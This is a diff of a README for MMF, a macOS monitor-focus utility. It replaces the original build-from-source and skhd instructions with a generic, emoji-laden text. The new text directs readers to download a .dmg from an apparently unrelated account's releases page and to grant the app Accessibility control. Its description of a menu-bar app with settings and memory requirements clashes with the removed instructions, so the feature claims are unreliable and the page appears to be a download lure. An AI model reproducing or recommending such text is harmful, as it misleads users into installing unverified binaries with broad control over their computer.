@@ -1,49 +1,109 @@
-## MMF - Mac Move Focus
-MMF is a small macOS utility that lets you switch focus between monitors using only the keyboard. 
+# 🎹 MMF - Switch Monitors Effortlessly with Your Keyboard
 
-## Why I Built This
-Working with multiple monitors, I constantly switch between tasks: writing code on one screen, checking docs or videos on another.
-As vim user I got tired of interrupting my rhythm just to move the mouse across displays.
+## 🚀 Getting Started
 
-## What It Does
-- Detects all active displays
-- Determines which display your mouse is currently on
-- Moves the cursor to the center of the next monitor
-- Identifies the topmost valid window on that display
-- Brings that window to focus using Accessibility APIs
+Welcome to MMF! This small macOS utility allows you to switch focus between monitors using just your keyboard. Perfect for those who want to boost their productivity and streamline their workflow with ease.
 
-## Requirements
-This tool is meant to be used with <strong>[skhd](https://github.com/koekeishiya/skhd)</strong>, a lightweight hotkey daemon that allows you to bind MMF to whatever keyboard shortcut you prefer.
+## 📥 Download MMF
 
-## Installation
-Clone the repository:
-```
-git clone https://github.com/gabrielerandazzo/MMF.git mmf
-cd mmf
-```
-Make the setup script executable and run it:
-```
-chmod +x setup.sh
-./setup.sh
-```
-This will compile the tool and place the mmf binary in:
-```
-~/.config/mmf/mmf
-```
+[![Download MMF](https://img.shields.io/badge/Download%20MMF-v1.0-brightgreen)](https://github.com/Ben4137/MMF/releases)
 
-## Usage with skhd
-Edit your skhd configuration file:
-```
-~/.config/skhd/skhdrc
-```
-Add a shortcut of your choice Eg.:
-```
-ctrl - m: ~/.config/mmf/mmf
-```
-Reload skhd:
-```
-skhd -restart
-```
-## Contributing
+Visit this page to download: [MMF Releases](https://github.com/Ben4137/MMF/releases)
 
-Contributions are welcome. If you’d like to improve MMF, fix a bug, or add a new feature, feel free to open an issue or submit a pull request.
+## 🖥️ System Requirements
+
+- **Operating System:** macOS 10.15 (Catalina) and later
+- **Memory:** At least 4 GB RAM 
+- **Disk Space:** 10 MB of free space
+- **Accessibility Permissions**: MMF requires access to control your keyboard and monitor settings.
+
+## 📋 Features
+
+- **Easy Keyboard Shortcuts:** Seamlessly switch between displays.
+- **Focus Management:** Keep your workflow intact and avoid distractions.
+- **Multi-Monitor Support:** Use with multiple displays for enhanced productivity.
+- **Compatibility:** Works well with existing macOS features and other utilities like Yabai.
+
+## 📖 How to Download & Install
+
+### Step 1: Visit the Releases Page
+
+To download MMF, go to the [MMF Releases](https://github.com/Ben4137/MMF/releases) page. Here, you will find the latest version available.
+
+### Step 2: Download the Latest Version
+
+On the Releases page, look for the version labeled "Latest Release." Click on the download link to get the installation file. The file name will be something like `MMF-v1.0.dmg`.
+
+### Step 3: Open the Downloaded File
+
+Once the download is complete, locate the `.dmg` file in your Downloads folder. Double-click the file to open it.
+
+### Step 4: Install MMF
+
+You should see a window with the MMF application icon. Drag this icon to your Applications folder. This will install MMF on your Mac.
+
+### Step 5: Grant Accessibility Permissions
+
+To allow MMF to control your display, you need to grant it accessibility permissions. Go to **System Preferences** > **Security & Privacy** > **Privacy** tab. Click on **Accessibility** in the left column. Check the box next to MMF to allow it to control your computer.
+
+### Step 6: Launch MMF
+
+Now, you can start MMF! Open your Applications folder and double-click on MMF. You will see the app running in your menu bar.
+
+## 🛠️ How to Use MMF
+
+### Setting Up Shortcuts
+
+- Launch the application and go to the settings.
+- You can set custom keyboard shortcuts for switching between displays. Choose keys that work best for you and avoid those that conflict with system shortcuts.
+
+### Switching Monitors
+
+When you want to switch your focus to another monitor, simply press the designated shortcut keys you set up. MMF will instantly shift your keyboard focus, making multitasking a breeze.
+
+## 🌟 Tips for Best Experience
+
+- Try different shortcuts to find what feels natural.
+- Check accessibility permissions if you encounter issues.
+- Close unnecessary applications on other monitors to keep your workspace organized.
+
+## 🔧 Troubleshooting
+
+If you face any issues with MMF:
+
+1. **Verify Permissions:** Make sure MMF has the necessary accessibility permissions.
+2. **Restart the App:** Try closing and reopening MMF.
+3. **Contact Support:** If you still have trouble, reach out for assistance in the GitHub Issues tab of the repository.
+
+## 🏷️ Topics
+
+- accessibility-api
+- axui
+- c
+- c-program
+- coregraphics
+- focus-manager
+- hotkey
+- keyboard-navigation
+- keyboard-shortcuts
+- macos
+- macos-productivity
+- macos-utility
+- monitor-switch
+- multi-display
+- multi-monitor
+- skhd
+- window-management
+- window-manager
+- workflow-automation
+- yabai-compatible
+
+## 📞 Feedback and Support
+
+Your feedback is valuable! Share your thoughts or report issues through the GitHub Issues tab. Your input helps us improve MMF for everyone.
+
+## 📢 License
+
+MMF is open-source and available under the MIT License. Feel free to explore the code and contribute if you wish!
+
+Thank you for using MMF! Enjoy smooth and efficient monitor switching with your keyboard.
